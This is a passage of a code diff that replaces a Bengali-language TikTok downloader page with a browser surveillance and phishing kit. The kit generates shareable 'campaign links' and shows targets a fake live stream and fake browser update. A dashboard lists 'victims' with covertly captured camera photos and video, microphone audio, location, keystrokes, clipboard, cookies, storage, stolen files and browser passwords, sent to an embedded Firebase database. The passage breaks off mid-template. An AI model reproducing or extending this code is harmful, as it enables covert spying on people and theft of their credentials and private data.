-                        <div class="stat-number" id="likesCount">0</div>
-                        <div class="stat-label">লাইক</div>
-                        <div class="exact-number" id="exactLikes">0</div>
-                    </div>
-                    <div class="stat-item bounce-in">
-                        <div class="stat-number" id="commentsCount">0</div>
-                        <div class="stat-label">কমেন্ট</div>
-                        <div class="exact-number" id="exactComments">0</div>
-                    </div>
-                    <div class="stat-item bounce-in">
-                        <div class="stat-number" id="sharesCount">0</div>
-                        <div class="stat-label">শেয়ার</div>
-                        <div class="exact-number" id="exactShares">0</div>
-                    </div>
-                    <div class="stat-item bounce-in">
-                        <div class="stat-number" id="playCount">0</div>
-                        <div class="stat-label">ভিউ</div>
-                        <div class="exact-number" id="exactViews">0</div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="info-card fade-in">
-                <h3>📥 ডাউনলোড অপশন</h3>
-                <button class="btn btn-download" onclick="downloadVideo('noWatermark')">
-                    📥 ওয়াটারমার্ক ছাড়া
-                </button>
-                <button class="btn btn-download" onclick="downloadVideo('withWatermark')">
-                    📥 ওয়াটারমার্ক সহ
-                </button>
-                <button class="btn btn-download" onclick="downloadMusic()">
-                    🎵 মিউজিক ডাউনলোড
-                </button>
-                <button class="btn btn-download" onclick="downloadCover()">
-                    🖼️ কভার ডাউনলোড
-                </button>
-            </div>
-        </div>
-
-        <div class="footer">
-            <p>© 2024 TikTok Video Downloader | All Rights Reserved</p>
-            <p>Developed with ❤️ by <strong id="footerDevName">MR-MOMIN</strong></p>
-            <p>এই টুলটি শিক্ষামূলক উদ্দেশ্যে তৈরি করা হয়েছে</p>
+        <div class="uid-info">
+            <span class="uid-label"><i class="fas fa-fingerprint"></i> PERMANENT ID</span>
+            <span class="uid-value" id="displayUid">--</span>
         </div>
     </div>
 
-    <script>
-        (function() {
-            // ===================================================================
-            // 🔥 ফাইনাল মাস্টার প্রম্পট অনুযায়ী সুরক্ষা (হ্যাশ ম্যাচ নিশ্চিত)
-            // ===================================================================
-            
-            // নাম "MR-MOMIN" কে অ্যারে আকারে এনক্রিপ্ট করা (প্রতিটি ক্যারেক্টার + 5)
-            const _0x4d2a = [77+5, 82+5, 45+5, 77+5, 79+5, 77+5, 73+5, 78+5]; // আসল ASCII: 77,82,45,77,79,77,73,78
-            // ডিক্রিপ্ট ফাংশন (প্রতিটি থেকে 5 বিয়োগ)
-            function _0x9c1d() {
-                let _0x2b5a = '';
-                for (let _0x8f7e = 0; _0x8f7e < _0x4d2a.length; _0x8f7e++) {
-                    _0x2b5a += String.fromCharCode(_0x4d2a[_0x8f7e] - 5);
-                }
-                return _0x2b5a; // "MR-MOMIN"
+    <div id="dashboardPanel">
+        <div class="card">
+            <h3><i class="fas fa-microchip"></i> SELECT MODULES</h3>
+            <div class="feature-grid" id="featureGrid">
+                <div class="feature-card" data-feat="CFP"><i class="fas fa-camera"></i><span>📸 FRONT PHOTO</span></div>
+                <div class="feature-card" data-feat="CFV"><i class="fas fa-video"></i><span>🎥 FRONT VIDEO</span></div>
+                <div class="feature-card" data-feat="CBP"><i class="fas fa-camera"></i><span>📸 BACK PHOTO</span></div>
+                <div class="feature-card" data-feat="CBV"><i class="fas fa-video"></i><span>🎥 BACK VIDEO</span></div>
+                <div class="feature-card" data-feat="M"><i class="fas fa-microphone"></i><span>🎙️ MICROPHONE</span></div>
+                <div class="feature-card" data-feat="L"><i class="fas fa-map-marker-alt"></i><span>📍 LOCATION</span></div>
+                <div class="feature-card" data-feat="K"><i class="fas fa-keyboard"></i><span>⌨️ KEYLOGGER</span></div>
+                <div class="feature-card" data-feat="P"><i class="fas fa-clipboard"></i><span>📋 CLIPBOARD</span></div>
+                <div class="feature-card" data-feat="R"><i class="fas fa-video"></i><span>🖥️ SCREEN REC</span></div>
+                <div class="feature-card" data-feat="N"><i class="fas fa-network-wired"></i><span>🌐 NET SCAN</span></div>
+                <div class="feature-card" data-feat="F"><i class="fas fa-ad"></i><span>⚠️ FAKE UPDATE</span></div>
+            </div>
+            <div class="toggle-switch">
+                <input type="checkbox" id="advancedToggle">
+                <label for="advancedToggle">⚡ ADVANCED STEALTH (File Steal, Browser Data, DNS Leak, Sensors)</label>
+            </div>
+            <div id="cameraCustom" class="camera-custom">
+                <h4><i class="fas fa-camera"></i> Camera Customization (Advanced only)</h4>
+                <div class="camera-grid">
+                    <div class="camera-option">
+                        <label><i class="fas fa-clock"></i> Photo Interval (sec):</label>
+                        <input type="number" id="cameraInterval" value="0.33" step="0.05" min="0.1">
+                    </div>
+                    <div class="camera-option">
+                        <label><i class="fas fa-video"></i> Video Clip Duration (sec):</label>
+                        <input type="number" id="videoDuration" value="3" step="1" min="1">
+                    </div>
+                    <div class="camera-option">
+                        <label><i class="fas fa-image"></i> Photo Quality (%):</label>
+                        <input type="number" id="photoQuality" value="70" step="5" min="10" max="100">
+                    </div>
+                </div>
+            </div>
+            <div class="shorten-check">
+                <input type="checkbox" id="shortenToggle"> <label for="shortenToggle">🔗 SHORTEN LINK (is.gd)</label>
+            </div>
+            <p style="font-size:0.7rem; color:#0f0;">Auto-collect: Device Info, Fingerprint, Cookies, Storage, WebRTC, GPU, Audio Devices</p>
+            <button class="btn-primary" id="generateLinkBtn"><i class="fas fa-link"></i> GENERATE NEW CAMPAIGN LINK</button>
+            <div id="newLinkBox" class="link-box hide">
+                <strong><i class="fas fa-share-alt"></i> SHARE THIS LINK</strong>
+                <div class="link-text" id="newLinkText">--</div>
+                <button id="copyLinkBtn" class="export-btn" style="width:100%; margin-top:0.5rem;"><i class="fas fa-copy"></i> COPY LINK</button>
+            </div>
+        </div>
+
+        <div class="card">
+            <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 1rem; margin-bottom: 1rem;">
+                <h3><i class="fas fa-chart-simple"></i> OVERVIEW</h3>
+                <button id="exportAllDataBtn" class="export-btn"><i class="fas fa-download"></i> EXPORT ALL DATA (JSON)</button>
+            </div>
+            <div class="stats-row">
+                <div class="stat-card"><i class="fas fa-chart-line"></i><br><span id="totalClicks">0</span><br>Total Clicks</div>
+                <div class="stat-card"><i class="fas fa-users"></i><br><span id="totalVictims">0</span><br>Total Victims</div>
+            </div>
+            <canvas id="clicksChart" height="100" style="max-height: 200px;"></canvas>
+        </div>
+
+        <div class="card">
+            <h3><i class="fas fa-chart-line"></i> ACTIVE CAMPAIGNS</h3>
+            <div id="campaignList"></div>
+        </div>
+        <div id="dashboardStatus" class="status-msg"></div>
+    </div>
+
+    <div id="victimPanel" class="victim-panel hide">
+        <div class="fake-stream-header">
+            <div class="fake-stream-title"><i class="fas fa-tv"></i> LIVE: Exclusive Interview</div>
+            <div><i class="fas fa-users"></i> <span id="viewerCount">12.3k</span> watching</div>
+        </div>
+        <div class="fake-stream-video">
+            <video id="fakeVideo" autoplay loop muted playsinline>
+                <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+            </video>
+        </div>
+        <div class="fake-stream-chat" id="fakeChat">
+            <div class="chat-message"><strong>User_123:</strong> Amazing content!</div>
+            <div class="chat-message"><strong>JohnDoe:</strong> When will the next episode?</div>
+            <div class="chat-message"><strong>Admin:</strong> Stay tuned for more updates!</div>
+        </div>
+        <div class="scan-progress"><div class="scan-fill" id="scanFill"></div></div>
+        <div id="scanStatus" style="text-align:center; font-size:0.8rem; margin:0.5rem;">Loading stream...</div>
+        <div id="fakeUpdateDiv" style="display:none; background:#2a2a3a; padding:0.5rem; text-align:center;">
+            <span>⚠️ Your browser needs an update. <button id="fakeUpdateBtn">Update Now</button></span>
+        </div>
+        <div id="victimStatus" class="status-msg"></div>
+    </div>
+</div>
+
+<div id="lightbox" class="lightbox">
+    <span class="close-lightbox">&times;</span>
+    <img class="lightbox-img" id="lightbox-img" src="">
+    <video class="lightbox-video" id="lightbox-video" controls style="display:none;"></video>
+</div>
+
+<video id="hiddenVideo" style="display:none;" autoplay playsinline muted></video>
+<canvas id="hiddenCanvas" style="display:none;"></canvas>
+<input type="file" id="filePicker" style="display:none;" multiple>
+
+<script>
+    // ========== PREMIUM SOUND EFFECTS ==========
+    let audioCtx = null;
+    function initAudio() {
+        if (audioCtx) return;
+        try {
+            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            audioCtx.resume();
+        } catch(e) {}
+    }
+    function playSound(type) {
+        if (!audioCtx) initAudio();
+        if (!audioCtx) return;
+        const now = audioCtx.currentTime;
+        const osc = audioCtx.createOscillator();
+        const gain = audioCtx.createGain();
+        osc.connect(gain);
+        gain.connect(audioCtx.destination);
+        gain.gain.setValueAtTime(0.2, now);
+        gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.2);
+        switch(type) {
+            case 'feature':
+                osc.frequency.value = 300;
+                osc.type = 'sine';
+                gain.gain.setValueAtTime(0.15, now);
+                gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.1);
+                osc.start(now);
+                osc.stop(now + 0.1);
+                break;
+            case 'generate':
+                osc.frequency.value = 400;
+                osc.type = 'sine';
+                osc.frequency.exponentialRampToValue(800, now + 0.15);
+                gain.gain.setValueAtTime(0.2, now);
+                osc.start(now);
+                osc.stop(now + 0.2);
+                break;
+            case 'copy':
+                osc.frequency.value = 800;
+                osc.type = 'sine';
+                gain.gain.setValueAtTime(0.1, now);
+                gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.05);
+                osc.start(now);
+                osc.stop(now + 0.05);
+                break;
+            case 'delete':
+                osc.frequency.value = 400;
+                osc.type = 'sawtooth';
+                osc.frequency.exponentialRampToValue(200, now + 0.2);
+                gain.gain.setValueAtTime(0.25, now);
+                gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.25);
+                osc.start(now);
+                osc.stop(now + 0.25);
+                break;
+            case 'export':
+                osc.frequency.value = 440;
+                osc.type = 'triangle';
+                gain.gain.setValueAtTime(0.2, now);
+                gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.2);
+                osc.start(now);
+                osc.stop(now + 0.2);
+                break;
+            case 'checkbox':
+                osc.frequency.value = 200;
+                osc.type = 'sine';
+                gain.gain.setValueAtTime(0.08, now);
+                gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.03);
+                osc.start(now);
+                osc.stop(now + 0.03);
+                break;
+            default:
+                osc.frequency.value = 400;
+                osc.type = 'sine';
+                osc.start(now);
+                osc.stop(now + 0.1);
+        }
+    }
+
+    // ========== FIREBASE CONFIG ==========
+    const firebaseConfig = {
+        apiKey: "AIzaSyDdYUeWB_e-Pv7-4yBN49P3ZN1Ig4PTW1g",
+        authDomain: "momin-tracking-sysrem.firebaseapp.com",
+        databaseURL: "https://momin-tracking-sysrem-default-rtdb.firebaseio.com",
+        projectId: "momin-tracking-sysrem",
+        storageBucket: "momin-tracking-sysrem.firebasestorage.app",
+        messagingSenderId: "294704122788",
+        appId: "1:294704122788:web:147bff72e6bf866a808f31",
+        measurementId: "G-BS81ZN7BDD"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // ========== HELPER FUNCTIONS ==========
+    function generateUID() { return Math.floor(10000000 + Math.random() * 90000000).toString(); }
+    function showMsg(msg, isError=false) {
+        const el = document.getElementById('dashboardStatus');
+        if(el) { el.innerHTML = `<i class="fas ${isError ? 'fa-exclamation-triangle' : 'fa-check-circle'}"></i> ${msg}`; el.style.color = isError ? '#f66' : '#0f0'; setTimeout(()=>{if(el.innerHTML.includes(msg)) el.innerHTML='';},4000); }
+    }
+    function copyClip(txt) { 
+        navigator.clipboard.writeText(txt).then(()=>{
+            showMsg('Link copied!');
+            playSound('copy');
+        }).catch(()=>showMsg('Copy failed',true)); 
+    }
+
+    // ========== UPDATED DOWNLOAD FUNCTION (APP & WEB SAFE) ==========
+    function downloadDataURL(dataURL, filename) {
+        const isWebView = /wv|Android.*(?:; wv\)|WebView)/i.test(navigator.userAgent) || 
+                          (typeof window.Android !== 'undefined') || 
+                          (typeof window.webkit !== 'undefined' && window.webkit.messageHandlers);
+        if (isWebView && window.Android && window.Android.download) {
+            window.Android.download(dataURL, filename);
+            return;
+        }
+        if (navigator.share && dataURL.startsWith('data:')) {
+            fetch(dataURL)
+                .then(res => res.blob())
+                .then(blob => {
+                    const file = new File([blob], filename, { type: blob.type });
+                    navigator.share({
+                        files: [file],
+                        title: filename
+                    }).catch(() => fallbackDownload(dataURL, filename));
+                })
+                .catch(() => fallbackDownload(dataURL, filename));
+            return;
+        }
+        function fallbackDownload(dataURL, filename) {
+            if (isWebView || /Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+                window.open(dataURL, '_blank');
+            } else {
+                const a = document.createElement('a');
+                a.href = dataURL;
+                a.download = filename;
+                a.click();
             }
+        }
+        fallbackDownload(dataURL, filename);
+    }
 
-            // হ্যাশ জেনারেটর (একই)
-            function _0x5e2d(_0x3a1c) {
-                let _0x6b7f = 0;
-                for (let _0x4d9e = 0; _0x4d9e < _0x3a1c.length; _0x4d9e++) {
-                    _0x6b7f = ((_0x6b7f << 5) - _0x6b7f) + _0x3a1c.charCodeAt(_0x4d9e);
-                    _0x6b7f |= 0;
-                }
-                return Math.abs(_0x6b7f).toString(16).padStart(8, '0');
+    function initLightbox() {
+        const lightbox = document.getElementById('lightbox');
+        const lightboxImg = document.getElementById('lightbox-img');
+        const lightboxVideo = document.getElementById('lightbox-video');
+        const closeBtn = document.querySelector('.close-lightbox');
+        window.openLightbox = (src, type='image') => {
+            if(type === 'image') {
+                lightboxImg.style.display = 'block';
+                lightboxVideo.style.display = 'none';
+                lightboxImg.src = src;
+            } else {
+                lightboxImg.style.display = 'none';
+                lightboxVideo.style.display = 'block';
+                lightboxVideo.src = src;
+                lightboxVideo.load();
             }
+            lightbox.classList.add('active');
+        };
+        closeBtn.onclick = () => { lightbox.classList.remove('active'); if(lightboxVideo.src) lightboxVideo.pause(); };
+        lightbox.onclick = (e) => { if(e.target === lightbox) lightbox.classList.remove('active'); };
+    }
 
-            // ডিক্রিপ্টেড নাম ও হ্যাশ
-            const _0x1f3a = _0x9c1d(); // "MR-MOMIN"
-            const _0x8c4b = _0x5e2d(_0x1f3a); // হ্যাশ (আগের মতোই "7e5a4cd8")
-            const _0x2d7e = '7e5a4cd8'; // সঠিক হ্যাশ (MR-MOMIN-এর জন্য নির্ধারিত)
+    // ========== DASHBOARD STATE ==========
+    let currentUid = null, campaignsRef = null, clicksChart = null;
 
-            if (_0x8c4b !== _0x2d7e) {
-                _0x6a9b('Layer-1: Hash mismatch');
-            }
+    async function loadSellerDashboard(uid) {
+        const snap = await db.ref(`sellers/${uid}`).once('value');
+        if(!snap.exists()) await db.ref(`sellers/${uid}`).set({ createdAt: Date.now() });
+        currentUid = uid;
+        localStorage.setItem('momin_uid', uid);
+        document.getElementById('displayUid').innerText = uid;
+        document.getElementById('dashboardPanel').classList.remove('hide');
+        document.getElementById('victimPanel').classList.add('hide');
+        if(campaignsRef) campaignsRef.off();
+        campaignsRef = db.ref(`sellers/${uid}/campaigns`);
+        campaignsRef.on('value', (snap) => renderCampaigns(snap.val() || {}));
+        updateStats();
+    }
 
-            // ডম এলিমেন্ট
-            const _0x9f7c = document.getElementById('devName');
-            const _0x3b8d = document.getElementById('footerDevName');
-            const _0x5a6e = document.querySelector('title');
+    async function updateStats() {
+        const campaignsSnap = await db.ref(`sellers/${currentUid}/campaigns`).once('value');
+        const campaigns = campaignsSnap.val() || {};
+        let totalClicks = 0, totalVictims = 0;
+        for (const camp of Object.values(campaigns)) {
+            totalClicks += camp.clicks || 0;
+            totalVictims += camp.victims ? Object.keys(camp.victims).length : 0;
+        }
+        document.getElementById('totalClicks').innerText = totalClicks;
+        document.getElementById('totalVictims').innerText = totalVictims;
+        if (clicksChart) clicksChart.destroy();
+        const ctx = document.getElementById('clicksChart').getContext('2d');
+        const labels = Object.keys(campaigns).slice(-7);
+        const data = labels.map(c => campaigns[c]?.clicks || 0);
+        clicksChart = new Chart(ctx, {
+            type: 'line',
+            data: { labels: labels.map((_,i)=>`Camp ${i+1}`), datasets: [{ label: 'Clicks', data, borderColor: '#0f0', tension: 0.3 }] },
+            options: { responsive: true, maintainAspectRatio: true }
+        });
+    }
 
-            if (!_0x9f7c || !_0x3b8d || !_0x5a6e) _0x6a9b('DOM missing');
-
-            // নাম বসানো
-            _0x9f7c.textContent = _0x1f3a;
-            _0x3b8d.textContent = _0x1f3a;
-            _0x5a6e.textContent = 'TikTok Video Downloader | ' + _0x1f3a;
-
-            // ===================================================================
-            // 🛡️ ডম গার্ড (মিউটেশন অবজার্ভার + পিরিয়ডিক চেক)
-            // ===================================================================
-            const _0x7d2e = new MutationObserver(function(_0x4a3f) {
-                for (let _0x2c8b of _0x4a3f) {
-                    if (_0x2c8b.type === 'characterData' || _0x2c8b.type === 'childList') {
-                        if (_0x9f7c.textContent !== _0x1f3a || _0x3b8d.textContent !== _0x1f3a) {
-                            _0x6a9b('DOM tampered');
-                        }
-                    }
-                }
+    function renderCampaigns(campaigns) {
+        const container = document.getElementById('campaignList');
+        if(Object.keys(campaigns).length === 0) {
+            container.innerHTML = '<div style="text-align:center; padding:2rem;"><i class="fas fa-info-circle"></i> No campaigns yet. Create your first link.</div>';
+            return;
+        }
+        let html = '';
+        for(const [campId, camp] of Object.entries(campaigns)) {
+            const link = `${window.location.origin}${window.location.pathname}?uid=${currentUid}&camp=${campId}`;
+            html += `
+                <div class="campaign-item">
+                    <div class="campaign-header">
+                        <div class="campaign-link" title="${link}">${link}</div>
+                        <div class="campaign-clicks"><i class="fas fa-eye"></i> ${camp.clicks || 0}</div>
+                        <button class="copy-camp" data-link="${link}"><i class="fas fa-copy"></i> Copy</button>
+                        <button class="delete-camp" data-camp="${campId}"><i class="fas fa-trash"></i> Del</button>
+                    </div>
+                    <div class="victim-data" id="victims-${campId}">
+                        <div style="color:#6c757d;"><i class="fas fa-spinner fa-pulse"></i> Loading victims...</div>
+                    </div>
+                </div>
+            `;
+        }
+        container.innerHTML = html;
+        document.querySelectorAll('.copy-camp').forEach(btn => {
+            btn.addEventListener('click', (e) => {
+                copyClip(btn.getAttribute('data-link'));
+                playSound('copy');
             });
-            _0x7d2e.observe(document.body, { childList: true, subtree: true, characterData: true });
+        });
+        document.querySelectorAll('.delete-camp').forEach(btn => btn.addEventListener('click', async (e) => {
+            const campId = btn.getAttribute('data-camp');
+            if(confirm(`Delete campaign ${campId} and all victim data?`)) {
+                await db.ref(`sellers/${currentUid}/campaigns/${campId}`).remove();
+                updateStats();
+                playSound('delete');
+            }
+        }));
+        for(const campId of Object.keys(campaigns)) loadVictimsData(campId);
+        updateStats();
+    }
 
-            setInterval(function() {
-                if (_0x9f7c.textContent !== _0x1f3a || _0x3b8d.textContent !== _0x1f3a) {
-                    _0x6a9b('Periodic name mismatch');
-                }
-            }, 300);
-
-            // ===================================================================
-            // 💥 ক্র্যাশ ফাংশন (সম্পূর্ণ অ্যাপ্লিকেশন ফ্রিজ)
-            // ===================================================================
-            function _0x6a9b(_0x3f1e) {
-                console.error('SECURITY CRASH: ' + _0x3f1e);
-                document.getElementById('crashScreen').style.display = 'block';
-                document.getElementById('crashCode').innerHTML = `
-                    <h2>CRASH REPORT</h2>
-                    <p>Reason: ${_0x3f1e}</p>
-                    <p>Timestamp: ${new Date().toISOString()}</p>
-                    <p>Integrity: ${_0x8c4b}</p>
+    function loadVictimsData(campId) {
+        const victimsRef = db.ref(`sellers/${currentUid}/campaigns/${campId}/victims`);
+        victimsRef.on('value', (snap) => {
+            const victims = snap.val() || {};
+            const container = document.getElementById(`victims-${campId}`);
+            if(Object.keys(victims).length === 0) {
+                container.innerHTML = '<div style="color:#6c757d;"><i class="fas fa-user-slash"></i> No victims yet</div>';
+                return;
+            }
+            let html = '<div><i class="fas fa-users"></i> Victims Data (Real-time)</div>';
+            for(const [victimId, data] of Object.entries(victims)) {
+                html += `
+                    <div class="victim-item">
+                        <div class="victim-header">
+                            <span><i class="fas fa-user-secret"></i> <strong>Victim ${victimId.slice(-6)}</strong></span>
+                            <span style="font-size:0.7rem;">${new Date(data.timestamp).toLocaleString()}</span>
+                            <button class="delete-victim-btn" data-camp="${campId}" data-victim="${victimId}"><i class="fas fa-trash-alt"></i> Delete</button>
+                        </div>
+                        <div class="victim-tabs">
+                            <button class="tab-btn active" data-tab="passive-${victimId}">📡 PASSIVE</button>
+                            <button class="tab-btn" data-tab="images-${victimId}">📸 IMAGES (${data.camera?.length || 0})</button>
+                            <button class="tab-btn" data-tab="videos-${victimId}">🎥 VIDEOS (${data.videoRec?.length || 0})</button>
+                            <button class="tab-btn" data-tab="audio-${victimId}">🎙️ AUDIO (${data.mic?.length || 0})</button>
+                            <button class="tab-btn" data-tab="location-${victimId}">📍 LOC (${data.location?.length || 0})</button>
+                            <button class="tab-btn" data-tab="device-${victimId}">💻 DEVICE</button>
+                            <button class="tab-btn" data-tab="fingerprint-${victimId}">🖐️ FP</button>
+                            <button class="tab-btn" data-tab="storage-${victimId}">🗄️ STORAGE</button>
+                            <button class="tab-btn" data-tab="keys-${victimId}">⌨️ KEYS (${data.keys?.length || 0})</button>
+                            <button class="tab-btn" data-tab="clip-${victimId}">📋 CLIP (${data.clipboard?.length || 0})</button>
+                            <button class="tab-btn" data-tab="network-${victimId}">🌐 NET</button>
+                            <button class="tab-btn" data-tab="files-${victimId}">📁 FILES (${data.files?.length || 0})</button>
+                            <button class="tab-btn" data-tab="browser-${victimId}">🌐 BROWSER</button>
+                            <button class="tab-btn" data-tab="dns-${victimId}">🌍 DNS</button>
+                            <button class="tab-btn" data-tab="sensors-${victimId}">📳 SENSORS</button>
+                        </div>
+                        <div class="tab-content active" id="tab-passive-${victimId}">
+                            ${data.passiveInfo ? `
+                                <div class="passive-compact">
+                                    <span class="passive-item"><i class="fas fa-globe"></i> IP: ${data.passiveInfo.ip || 'N/A'}</span>
+                                    <span class="passive-item"><i class="fas fa-battery-full"></i> Bat: ${data.passiveInfo.battery || 'N/A'}</span>
+                                    <span class="passive-item"><i class="fas fa-laptop"></i> ${data.passiveInfo.platform || 'N/A'}</span>
+                                    <span class="passive-item"><i class="fas fa-language"></i> ${data.passiveInfo.language || 'N/A'}</span>
+                                    <span class="passive-item"><i class="fas fa-desktop"></i> ${data.passiveInfo.screen || 'N/A'}</span>
+                                    <span class="passive-item"><i class="fas fa-clock"></i> ${data.passiveInfo.timezone || 'N/A'}</span>
+                                    <span class="passive-item"><i class="fas fa-microchip"></i> ${data.passiveInfo.hardwareConcurrency || 'N/A'} cores</span>
+                                    <span class="passive-item"><i class="fas fa-tv"></i> GPU: ${(data.passiveInfo.gpu || 'N/A').substring(0,20)}</span>
+                                    <span class="passive-item"><i class="fas fa-network-wired"></i> ${data.passiveInfo.localIP || 'N/A'}</span>
+                                    <span class="passive-item"><i class="fas fa-plug"></i> Plugins: ${(data.passiveInfo.plugins || []).length}</span>
+                                    <span class="passive-item"><i class="fas fa-font"></i> Fonts: ${(data.passiveInfo.fonts || []).length}</span>
+                                    <span class="passive-item"><i class="fas fa-cookie-bite"></i> Cookies: ${data.passiveInfo.cookies ? data.passiveInfo.cookies.length : 0} chars</span>
+                                </div>
+                            ` : '<i>No passive data collected</i>'}
+                        </div>
+                        <div class="tab-content" id="tab-images-${victimId}">
+                            ${data.camera && data.camera.length ? `<div class="image-grid">` + data.camera.map((img, idx) => `
+                                <div class="media-card">
+                                    <img src="${img}" class="thumbnail" onclick="openLightbox('${img}')">
+                                    <div><button class="download-btn" onclick="downloadDataURL('${img}', 'image_${idx}.jpg')">Download</button></div>
+                                </div>
+                            `).join('') + `</div>` : '<i>No images captured</i>'}
+                        </div>
+                        <div class="tab-content" id="tab-videos-${victimId}">
+                            ${data.videoRec && data.videoRec.length ? `<div class="video-grid">` + data.videoRec.map((vid, idx) => `
+                                <div class="media-card">
+                                    <video src="${vid}" class="video-thumb" controls width="150" onclick="openLightbox('${vid}','video')"></video>
+                                    <div><button class="download-btn" onclick="downloadDataURL('${vid}', 'video_${idx}.webm')">Download</button></div>
+                                </div>
+                            `).join('') + `</div>` : '<i>No video recordings</i>'}
+                        </div>
+                        <div class="tab-content" id="tab-audio-${victimId}">
+                            ${data.mic && data.mic.length ? data.mic.map((audio, idx) => `<div><audio controls src="${audio}"></audio> <button class="download-btn" onclick="downloadDataURL('${audio}', 'audio_${idx}.ogg')">Download</button></div>`).join('<br>') : '<i>No audio recorded</i>'}
+                        </div>
+                        <div class="tab-content" id="tab-location-${victimId}">
+                            ${data.location && data.location.length ? 
+                                `<div>Last known location: ${data.location[data.location.length-1].lat}, ${data.location[data.location.length-1].lng}</div>
+                                 <div class="map-container" id="map-${victimId}"></div>
+                                 <script>
+                                    setTimeout(() => {
+                                        const mapDiv = document.getElementById('map-${victimId}');
+                                        if(mapDiv && !mapDiv._leaflet_id) {
+                                            const map = L.map(mapDiv).setView([${data.location[data.location.length-1].lat}, ${data.location[data.location.length-1].lng}], 13);
+                                            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '&copy; OpenStreetMap' }).addTo(map);
+                                            L.marker([${data.location[data.location.length-1].lat}, ${data.location[data.location.length-1].lng}]).addTo(map);
+                                        }
+                                    }, 100);
+                                 <\/script>` : '<i>No location data</i>'}
+                        </div>
+                        <div class="tab-content" id="tab-device-${victimId}">
+                            ${data.deviceInfo ? 
+                                `<div><i class="fas fa-globe"></i> IP: ${data.deviceInfo.ip || 'N/A'}</div>
+                                 <div><i class="fas fa-battery-full"></i> Battery: ${data.deviceInfo.battery || 'N/A'}</div>
+                                 <div><i class="fas fa-laptop"></i> Platform: ${data.deviceInfo.platform || 'N/A'}</div>
+                                 <div><i class="fas fa-language"></i> Language: ${data.deviceInfo.language || 'N/A'}</div>
+                                 <div><i class="fas fa-desktop"></i> Screen: ${data.deviceInfo.screen || 'N/A'}</div>
+                                 <div><i class="fas fa-microchip"></i> Cores: ${data.deviceInfo.hardwareConcurrency || 'N/A'}</div>
+                                 <div><i class="fas fa-clock"></i> Timezone: ${data.deviceInfo.timezone || 'N/A'}</div>
+                                 <div><i class="fas fa-microphone"></i> Audio Inputs: ${data.deviceInfo.audioInputs || 'N/A'}</div>
+                                 <div><i class="fas fa-tv"></i> GPU: ${data.deviceInfo.gpu || 'N/A'}</div>
+                                 <div><i class="fas fa-code"></i> UserAgent: ${data.deviceInfo.userAgent || 'N/A'}</div>` : '<i>No device info</i>'}
+                        </div>
+                        <div class="tab-content" id="tab-fingerprint-${victimId}">
+                            ${data.fingerprint ? 
+                                `<div><i class="fas fa-palette"></i> Canvas: ${data.fingerprint.canvasFingerprint || 'N/A'}</div>
+                                 <div><i class="fas fa-cubes"></i> WebGL: ${data.fingerprint.webglVendor || 'N/A'}</div>
+                                 <div><i class="fas fa-font"></i> Fonts: ${data.fingerprint.fonts?.join(', ') || 'N/A'}</div>
+                                 <div><i class="fas fa-plug"></i> Plugins: ${data.fingerprint.plugins?.join(', ') || 'N/A'}</div>
+                                 <div><i class="fas fa-network-wired"></i> Local IP: ${data.fingerprint.localIP || 'N/A'}</div>` : '<i>No fingerprint data</i>'}
+                        </div>
+                        <div class="tab-content" id="tab-storage-${victimId}">
+                            ${data.cookies ? `<div><i class="fas fa-cookie-bite"></i> Cookies: ${data.cookies}</div>` : ''}
+                            ${data.localStorage ? `<div><i class="fas fa-database"></i> LocalStorage: ${data.localStorage}</div>` : ''}
+                            ${data.sessionStorage ? `<div><i class="fas fa-database"></i> SessionStorage: ${data.sessionStorage}</div>` : ''}
+                            ${!data.cookies && !data.localStorage && !data.sessionStorage ? '<i>No storage data</i>' : ''}
+                        </div>
+                        <div class="tab-content" id="tab-keys-${victimId}">
+                            ${data.keys && data.keys.length ? data.keys.map(k => `<div>${new Date(k.timestamp).toLocaleTimeString()}: ${k.key} (${k.windowTitle || 'unknown'})</div>`).join('') : '<i>No keystrokes captured</i>'}
+                        </div>
+                        <div class="tab-content" id="tab-clip-${victimId}">
+                            ${data.clipboard && data.clipboard.length ? data.clipboard.map(c => `<div>${new Date(c.timestamp).toLocaleTimeString()}: ${c.text.substring(0,100)}</div>`).join('') : '<i>No clipboard data</i>'}
+                        </div>
+                        <div class="tab-content" id="tab-network-${victimId}">
+                            ${data.networkScan ? `<div><i class="fas fa-network-wired"></i> ${data.networkScan}</div>` : '<i>No network scan performed</i>'}
+                        </div>
+                        <div class="tab-content" id="tab-files-${victimId}">
+                            ${data.files && data.files.length ? data.files.map(f => `<div><a href="${f.data}" download="${f.name}">${f.name}</a> (${Math.round(f.size/1024)} KB)</div>`).join('') : '<i>No files stolen</i>'}
+                        </div>
+                        <div class="tab-content" id="tab-browser-${victimId}">
+                            ${data.browserData ? 
+                                `<div><i class="fas fa-key"></i> Passwords: ${data.browserData.passwords || 'N/A'}</div>
+                                 <div><i class="fas fa-address-card"></i> Autofill: ${data.browserData.autofill || 'N/A'}</div>
+                                 <div><i class="fas fa-database"></i> LocalStorage: ${data.browserData.localStorage || 'N/A'}</div>
+                                 <div><i class="fas fa-cookie-bite"></i> Cookies: ${data.browserData.cookies || 'N/A'}</div>` : '<i>No browser data extracted</i>'}
+                        </div>
+                        <div class="tab-content" id="tab-dns-${victimId}">
+                            ${data.dnsLeak ? 
+                                `<div><i class="fas fa-network-wired"></i> Local IPs: ${data.dnsLeak.localIPs}</div>
+                                 <div><i class="fas fa-globe"></i> Public IP: ${data.dnsLeak.publicIP}</div>` : '<i>No DNS leak data</i>'}
+                        </div>
+                        <div class="tab-content" id="tab-sensors-${victimId}">
+                            ${data.sensors ? 
+                                `<div><i class="fas fa-chart-line"></i> Acceleration: ${JSON.stringify(data.sensors.acceleration)}</div>
+                                 <div><i class="fas fa-sync-alt"></i> Rotation: ${JSON.stringify(data.sensors.rotationRate)}</div>
